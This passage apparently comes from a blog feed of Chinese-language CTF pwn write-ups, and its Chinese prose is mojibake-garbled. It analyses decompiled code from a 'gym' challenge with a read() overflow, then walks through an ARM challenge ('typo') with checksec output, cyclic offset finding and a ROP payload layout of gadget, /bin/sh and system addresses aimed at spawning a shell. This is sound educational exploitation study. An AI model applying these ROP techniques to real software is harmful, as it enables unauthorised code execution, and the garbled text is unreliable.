punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to the BPSEC gym\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. Check your bmi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2. Exercise"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3. Register personal training"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"4. Write daily record"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"5. Have some health menu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"6. Out of the gym\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Type the number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v3 <span class="token operator">=</span> <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v9 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token function">check</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>          <span class="token function">exercise</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          <span class="token function">check_first</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>          v8 <span class="token operator">=</span> <span class="token function">PT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          <span class="token function">check_first</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token punctuation">)</span>          <span class="token function">write_diary</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v8<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you should take personal training first!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token function">diet_menu</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>LABEL_14<span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"See you again :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid number :("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>è¿›å…¥case3çš„PTå‡½æ•°å¯ä»¥çœ‹åˆ°ä¸€ä¸ªåˆ¤æ–­ï¼š</p><pre class=" language-c"><code class="language-c">size_t <span class="token function">PT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  size_t v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// r3</span>  size_t size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+4h] [bp-10h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+8h] [bp-Ch]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+Ch] [bp-8h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's start personal training"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How long do you want to take personal training?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//ptr å°†ä¼šç”³è¯·ä¸€ä¸ªsizeå¤§å°çš„å†…å­˜ç©ºé—´ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥-1ç»™sizeï¼Œé‚£ä¹ˆmallocä¼šç”³è¯·å¤±è´¥å¯¼è‡´pträ¸ºnull</span>  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> ptr <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>exc2 <span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//ptr == NULL åˆ¤æ–­æˆç«‹å¯ä»¥è¿›å…¥case4</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Okay, start to exercise!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>size<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you are getting healthy.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    v0 <span class="token operator">=</span> size<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Check your bmi again!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    v0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> v0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ä¹‹å‰è®°çš„é‚£ä¸ªçœ‹èµ·æ¥åƒæ˜¯çªç ´ç‚¹çš„åœ°æ–¹å…¶å®å¹¶ä¸æ˜¯ï¼ŒçœŸæ­£çš„æº¢å‡ºç‚¹åœ¨case4ï¼š</p><pre class=" language-c"><code class="language-c">_DWORD <span class="token operator">*</span>__fastcall <span class="token function">write_diary</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>result<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+0h] [bp-14h]</span>  <span class="token keyword">unsigned</span> __int8 nbytes<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+Fh] [bp-5h]</span>  buf <span class="token operator">=</span> a2<span class="token punctuation">;</span>  nbytes <span class="token operator">=</span> <span class="token operator">*</span>result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> nbytes <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> a2<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//æº¢å‡ºç‚¹å•¦</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you wrote %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ç„¶åå‘¢ï¼Œä»è¿™é‡Œå°±åˆ°äº†å¼€å§‹ç–¯ç‹‚çš„è¡¥å§¿åŠ¿çš„æ—¶å€™äº†ã€‚å› ä¸ºè¿™é¢˜å’Œä¸Šé¢˜ç±»ä¼¼ï¼Œéœ€è¦æˆ‘ä»¬æ‰¾åˆ°systemå‡½æ•°çš„åœ°å€æ‰è¡Œå‘¢ï¼Œç»™è‡ªå·±æŒ–äº†ä¸ªå¤§å‘ï¼Œä»¥åå†æ¥å¡«å§ã€‚</p></blockquote><h3 id="systemåœ°å€æ³„éœ²-amp-amp-leak-libc"><a href="#systemåœ°å€æ³„éœ²-amp-amp-leak-libc" class="headerlink" title="systemåœ°å€æ³„éœ²&amp;&amp;leak libc"></a>systemåœ°å€æ³„éœ²&amp;&amp;leak libc</h3><p><a href="http://www.freebuf.com/articles/rookie/155971.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p><p><a href="https://www.cnblogs.com/HacTF/p/8052175.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p><blockquote><p> ã€1ã€‘åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²æ ˆä¸­çš„æ•°æ®ï¼Œä»è€Œæ‰¾åˆ°libcçš„æŸä¸ªå‡½æ•°åœ°å€ï¼Œå†åˆ©ç”¨libc-databaseæ¥åˆ¤æ–­è¿œç¨‹libcçš„ç‰ˆæœ¬ï¼Œä¹‹åå†è®¡ç®—å‡ºlibcçš„åŸºå€ã€‚</p><p>ã€2ã€‘åˆ©ç”¨writeè¿™ä¸ªå‡½æ•°ï¼Œpwntoolsæœ‰ä¸ªå¾ˆå¥½ç”¨çš„å‡½æ•°DynELFå»åˆ©ç”¨è¿™ä¸ªå‡½æ•°è®¡ç®—å‡ºç¨‹åºçš„å„ç§åœ°å€ï¼ŒåŒ…æ‹¬å‡½æ•°çš„åŸºåœ°å€ï¼Œlibcçš„åŸºåœ°å€ï¼Œlibcä¸­systemçš„åœ°å€ã€‚</p><p>ã€3ã€‘åˆ©ç”¨printfå‡½æ•°ï¼Œprintfå‡½æ•°è¾“å‡ºçš„æ—¶å€™é‡åˆ°0x00æ—¶å€™ä¼šåœæ­¢è¾“å‡ºï¼Œå¦‚æœè¾“å…¥çš„æ—¶å€™æ²¡æœ‰åœ¨æœ€åçš„å­—èŠ‚å¤„å¡«å……0x00ï¼Œé‚£ä¹ˆè¾“å‡ºçš„æ—¶å€™å°±å¯èƒ½æ³„éœ²æ ˆä¸­çš„é‡è¦æ•°æ®ï¼Œæ¯”å¦‚libcçš„æŸä¸ªå‡½æ•°åœ°å€ã€‚</p></blockquote><blockquote><p><strong>å…³äºPLTï¼ˆè¿›ç¨‹é“¾æ¥è¡¨ï¼‰å’ŒGOTï¼ˆGlobal Offset Table-å…¨å±€åç§»è¡¨ï¼‰</strong>ï¼šä¸ºäº†çµæ´»åˆ©ç”¨è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œæ‰€ä»¥ç¼–è¯‘å™¨å¯ä»¥äº§ç”Ÿä½ç½®æ— å…³çš„ä»£ç ã€‚å¯æ‰§è¡Œæ–‡ä»¶å¯ä»¥æ˜¯ä½ç½®æ— å…³çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯ä½ç½®ç›¸å…³çš„ï¼Œ åŠ¨æ€é“¾æ¥åº“ç»å¤§å¤šæ•°éƒ½æ˜¯ä½ç½®æ— å…³çš„ã€‚ GOTè¡¨å¯å†™ä¸å¯æ‰§è¡Œï¼Œ PLTå¯æ‰§è¡Œä¸å¯å†™ã€‚ä»–ä»¬ç›¸äº’ä½œç”¨æ¥å®ç°å‡½æ•°ç¬¦å·çš„å»¶æ—¶ç»‘å®š.ã€‚ASLRå¹¶ä¸éšæœºåŒ–PLTéƒ¨åˆ†ï¼Œæ‰€ä»¥å¯¹ret2pltæ”»å‡»æ²¡æœ‰ç›´æ¥å½±å“ã€‚ ä¸ºé˜²æ­¢æ¶æ„ä¿®æ”¹gotï¼Œ é“¾æ¥å™¨æä¾›äº†RELROé€‰é¡¹,ï¼Œå»é™¤gotçš„å†™æƒé™ï¼Œ ä½†ä¹Ÿç‰ºç‰²äº†å»¶æ—¶ç»‘å®šå¸¦æ¥çš„å¥½å¤„ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> äºŒè¿›åˆ¶å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10æœˆ15-qemu</title>
      <link href="/2018/10/15/Pwn-10%E6%9C%8815-qemu/"/>
      <url>/2018/10/15/Pwn-10%E6%9C%8815-qemu/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Pwn-10æœˆ15-ç®€å•äº†è§£å¼‚æ„pwné¢˜"><a href="#Pwn-10æœˆ15-ç®€å•äº†è§£å¼‚æ„pwné¢˜" class="headerlink" title="Pwn-10æœˆ15-ç®€å•äº†è§£å¼‚æ„pwné¢˜"></a>Pwn-10æœˆ15-ç®€å•äº†è§£å¼‚æ„pwné¢˜</h1><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; å‚ç…§m4xå¤§ä½¬çš„åšå®¢ç®€å•åœ°æ­å»ºäº†ä¸€ä¸‹ç¯å¢ƒåï¼Œç»§ç»­æ¥ç»ƒç»ƒæ‰‹ï¼Œç®€å•äº†è§£ä¸€ä¸‹å¼‚æ„binaryè°ƒè¯•ï¼Œå¦‚armï¼Œmipsï¼Œç¯å¢ƒæ­å»ºå‚ç…§ä¸Šä¸€ç¯‡ã€‚</p><p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt=""></p><p>arm çš„å‚æ•° 1 ~ 4 åˆ†åˆ«ä¿å­˜åˆ° r0 ~ r3 å¯„å­˜å™¨ä¸­, å‰©ä¸‹çš„å‚æ•°ä»å³å‘å·¦ä¾æ¬¡å…¥æ ˆ, è¢«è°ƒç”¨è€…å®ç°æ ˆå¹³è¡¡, è¿”å›å€¼å­˜æ”¾åœ¨ r0 ä¸­ ã€‚arm çš„ pc æŒ‡é’ˆç›¸å½“äº eip/rip, b/bl ç­‰æŒ‡ä»¤å®ç°äº†è·³è½¬ </p></blockquote><h2 id="Jarvis-oj-typo"><a href="#Jarvis-oj-typo" class="headerlink" title="Jarvis oj - typo"></a>Jarvis oj - typo</h2><blockquote><p>ç®€å•è¯´ä¸€ä¸‹æ­¥éª¤ï¼šå…ˆæŸ¥çœ‹ä¿æŠ¤æªæ–½ï¼Œå¯ä»¥å‘ç°æ²¡æœ‰æ ˆæº¢å‡ºä¿æŠ¤ï¼Œè¿è¡Œç¨‹åºæœ‰æº¢å‡ºç‚¹å¯ä»¥åˆ©ç”¨ï¼Œç„¶åå¯ä»¥æ‰¾åˆ°æº¢å‡ºç‚¹ä½ç½®ï¼Œæ‰¾åˆ°systemå‡½æ•°ï¼Œä»¥åŠ/bin/shå­—ç¬¦ä¸²çš„ä½ç½®ï¼Œç„¶åæ‹¿åˆ°èƒ½å¤Ÿæ§åˆ¶ r0å¯„å­˜å™¨</p></blockquote><h3 id="ä¸€-æŸ¥çœ‹ä¿æŠ¤æªæ–½"><a href="#ä¸€-æŸ¥çœ‹ä¿æŠ¤æªæ–½" class="headerlink" title="ä¸€. æŸ¥çœ‹ä¿æŠ¤æªæ–½"></a>ä¸€. æŸ¥çœ‹ä¿æŠ¤æªæ–½</h3><blockquote><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#checksec typo</span>    Arch:     arm-32-little    <span class="token comment" spellcheck="true">#32ä½å°ç«¯åº armæ¶æ„ç¨‹åº</span>    RELRO:    Partial RELRO    Stack:    No canary found    <span class="token comment" spellcheck="true">#æ— æ ˆæº¢å‡ºä¿æŠ¤</span>    NX:       NX enabled            PIE:      No PIE <span class="token punctuation">(</span>0x8000<span class="token punctuation">)</span></code></pre><blockquote><p>é¡ºä¾¿å­¦ä¹ ä¸€ä¸‹å‡ ç§é˜²æŠ¤æªæ–½çš„æ„æ€ï¼š</p><p> å‚è€ƒé“¾æ¥ï¼š<a href="https://www.jianshu.com/p/6e528b33e37a" target="_blank" rel="noopener">https://www.jianshu.com/p/6e528b33e37a</a></p><p> â€‹    <strong>RELRO</strong>:åœ¨Linuxç³»ç»Ÿå®‰å…¨é¢†åŸŸæ•°æ®å¯ä»¥å†™çš„å­˜å‚¨åŒºå°±ä¼šæ˜¯æ”»å‡»çš„ç›®æ ‡ï¼Œå°¤å…¶æ˜¯å­˜å‚¨å‡½æ•°æŒ‡é’ˆçš„åŒºåŸŸï¼Œå°½é‡å‡å°‘å¯å†™çš„å­˜å‚¨åŒºåŸŸå¯ä½¿å®‰å…¨ç³»æ•°æé«˜ã€‚GCC, GNU linkerä»¥åŠGlibc-dynamic linkerä¸€èµ·é…åˆå®ç°äº†ä¸€ç§å«åšrelroçš„æŠ€æœ¯Relocation Read Only, é‡å®šå‘åªè¯»ï¼Œå®ç°å°±æ˜¯ç”±linkeræŒ‡å®šbinaryçš„ä¸€å—ç»è¿‡dynamic linkerå¤„ç†è¿‡ relocationä¹‹åçš„åŒºåŸŸä¸ºåªè¯»ã€‚</p><p> â€‹    æ ˆæº¢å‡ºæ£€æŸ¥ï¼Œç”¨<strong>Canaryé‡‘ä¸é›€å€¼</strong>æ˜¯å¦å˜åŒ–æ¥æ£€æµ‹,Canary foundè¡¨ç¤ºå¼€å¯ã€‚é‡‘ä¸é›€æœ€æ—©æŒ‡çš„æ˜¯çŸ¿å·¥æ›¾åˆ©ç”¨é‡‘ä¸é›€æ¥ç¡®è®¤æ˜¯å¦æœ‰æ°”ä½“æ³„æ¼ï¼Œå¦‚æœé‡‘ä¸é›€å› ä¸ºæ°”ä½“æ³„æ¼è€Œä¸­æ¯’æ­»äº¡ï¼Œå¯ä»¥ç»™çŸ¿å·¥é¢„è­¦ã€‚è¿™é‡Œæ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼šå¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxå°†cookieä¿¡æ¯ç§°ä¸ºCanaryã€‚</p><p> <strong> NX </strong> : No Executeï¼Œæ ˆä¸å¯æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯windowsä¸Šçš„DEPã€‚ åˆ†æç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼Œå…¶æ ¹æºåœ¨äºç°ä»£è®¡ç®—æœºå¯¹æ•°æ®å’Œä»£ç æ²¡æœ‰æ˜ç¡®åŒºåˆ†è¿™ä¸€å…ˆå¤©ç¼ºé™·ï¼Œå°±ç›®å‰æ¥çœ‹é‡æ–°å»è®¾è®¡è®¡ç®—æœºä½“ç³»ç»“æ„åŸºæœ¬ä¸Šæ˜¯ä¸å¯èƒ½çš„ï¼Œæˆ‘ä»¬åªèƒ½é å‘å‰å…¼å®¹çš„ä¿®è¡¥æ¥å‡å°‘æº¢å‡ºå¸¦æ¥çš„æŸå®³ï¼ŒDEPå°±æ˜¯ç”¨æ¥å¼¥è¡¥è®¡ç®—æœºå¯¹æ•°æ®å’Œä»£ç æ··æ·†è¿™ä¸€å¤©ç„¶ç¼ºé™·çš„ã€‚ </p><p> <strong>PIE</strong>: position-independent executables, ä½ç½®æ— å…³çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„ASLR(Address space layout randomization) åœ°å€éšæœºåŒ–ï¼Œç¨‹åºæ¯æ¬¡å¯åŠ¨åŸºå€éƒ½éšæœºã€‚ </p></blockquote></blockquote><h3 id="äºŒ-åˆ†æç¨‹åº"><a href="#äºŒ-åˆ†æç¨‹åº" class="headerlink" title="äºŒ. åˆ†æç¨‹åº"></a>äºŒ. åˆ†æç¨‹åº</h3><blockquote><p>å¼€å§‹è¿œç¨‹è°ƒè¯•ï¼š</p><p><img src="https://i.loli.net/2018/10/15/5bc4403f1bdbb.png" alt=""></p><p>å¦ä¸€è¾¹ä½¿ç”¨ <code>gdb-multiarch typo -q</code>è¿›å…¥pwndbgï¼Œå¹¶ä¸”ä½¿ç”¨<code>target remote localhost:6788</code>è¿æ¥ç¨‹åºï¼š</p><p><img src="https://i.loli.net/2018/10/15/5bc4437a3ebb6.png" alt=""></p><p>ç”Ÿæˆpaddingï¼Œè¾“å…¥åå¾—åˆ°æº¢å‡ºä¿¡æ¯</p><pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> cyclic 200aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</code></pre><p><img src="https://i.loli.net/2018/10/15/5bc4443368612.png" alt=""></p></blockquote><h3 id="ä¸‰-ç¡®å®šæº¢å‡ºç‚¹"><a href="#ä¸‰-ç¡®å®šæº¢å‡ºç‚¹" class="headerlink" title="ä¸‰.ç¡®å®šæº¢å‡ºç‚¹"></a>ä¸‰.ç¡®å®šæº¢å‡ºç‚¹</h3><blockquote><p>ä¹‹å‰å·²ç»è¯´è¿‡PCç›¸å½“äºEIP,RIPä¹‹ç±»çš„æŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤çš„å¯„å­˜å™¨ï¼Œé‚£ä¹ˆå¯ä»¥è®¡ç®—paddingåˆ°PCå¯„å­˜å™¨çš„åç§»é‡è¿›è€Œç¡®å®šæº¢å‡ºç‚¹ä¸º0x62616165ï¼š</p><p>ä½¿ç”¨pwndbgçš„<code>cyclic -l</code>å‘½ä»¤å¯ä»¥é€šè¿‡åœ°å€ï¼Œå­—ç¬¦ä¸²ç¡®å®šåç§»é‡.</p><p><img src="https://i.loli.net/2018/10/15/5bc445613c9bc.png" alt=""></p></blockquote><h3 id="å››-æ„é€ payloadè¿›è¡Œåˆ©ç”¨"><a href="#å››-æ„é€ payloadè¿›è¡Œåˆ©ç”¨" class="headerlink" title="å››.æ„é€ payloadè¿›è¡Œåˆ©ç”¨"></a>å››.æ„é€ payloadè¿›è¡Œåˆ©ç”¨</h3><blockquote><p> é»˜é»˜æ ‡è®°M4xåšæ–‡ä¸­çš„è¿™å¥è¯<code>å› ä¸ºæ˜¯é™æ€é“¾æ¥, æ‰€ä»¥ binary ä¸­ä¸€å®šä¼šæœ‰ system å‡½æ•° å’Œ /bin/sh å­—ç¬¦ä¸², å¦‚æœèƒ½æ‰¾åˆ°æº¢å‡ºç‚¹, å¾ˆå®¹æ˜“å°±èƒ½ç”¨ rop æ¥è§£å†³äº†</code>ï¼Œå­¦ä¹ ä¸€æ³¢å§¿åŠ¿ï¼Œæ„é€ <code>rop chain</code>ï¼Œé€šè¿‡ROPgadgetå¯ä»¥æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„ï¼šå¯ä»¥ç”¨æ¥ä¼ é€’ è¿”å›å€¼çš„å¯„å­˜å™¨ r0</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc4465b7fefb.png" class="lazyload"></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾systemå‡½æ•°çš„åœ°å€ï¼Œå°†å…¶å¡«å…¥PCå¯„å­˜å™¨çš„ä½ç½®ï¼Œä»è€Œæ‰§è¡Œ<code>system(&#39;/bin/sh&#39;)</code></p><p>IDAè°ƒè¯•ä¸€æ³¢ï¼š</p><p>é€šè¿‡å­—ç¬¦ä¸²æŸ¥æ‰¾æˆ–è€…äº¤å‰å¼•ç”¨å¯ä»¥å‘ç°å‡½æ•°<code>sub_10BA8</code></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc44948ebb68.png" class="lazyload"></p><p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯ida7.0çš„åŸå› ï¼Œè¿™é‡Œç›´æ¥æ‰¾åˆ°äº†systemå‡½æ•°ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc44a0873387.png" class="lazyload"></p><p>å¯ä»¥çœ‹åˆ°å…¶æ‰§è¡Œå‘½ä»¤çš„é€»è¾‘å’Œåœ°å€ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc44d1ac5d50.png" class="lazyload"></p><p>æ¥ä¸‹æ¥å¯ä»¥å¼€å§‹æ„é€ payloadç»“æ„ï¼š</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">|</span>    padding            <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> 112*<span class="token string">'a'</span><span class="token operator">|</span>    pop <span class="token punctuation">{</span>r0,r4,pc<span class="token punctuation">}</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x20904<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#gadget_addr</span><span class="token operator">|</span>    /bin/sh            <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x6c384<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#/bin/sh_addr</span><span class="token operator">|</span>    junk_data<span class="token punctuation">(</span>r4<span class="token punctuation">)</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span><span class="token string">"anything"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#r4å¡«å……</span><span class="token operator">|</span>    system_addr<span class="token punctuation">(</span>pc<span class="token punctuation">)</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x110b4<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#systemå‡½æ•°åœ°å€</span></code></pre><p><strong>æº¢å‡ºå¯¼è‡´PCæŒ‡å‘gadget_addrï¼Œç„¶åæ‰§è¡Œå‘½ä»¤popå‡ºæ ˆå°†â€/bin/shâ€èµ‹å€¼åˆ°r0å¯„å­˜å™¨ï¼Œjunk_dataèµ‹å€¼åˆ°r4å¯„å­˜å™¨ï¼Œsystem_addrèµ‹å€¼åˆ°PCå¯„å­˜å™¨ã€‚</strong></p></blockquote><h3 id="äº”-æ”»ç 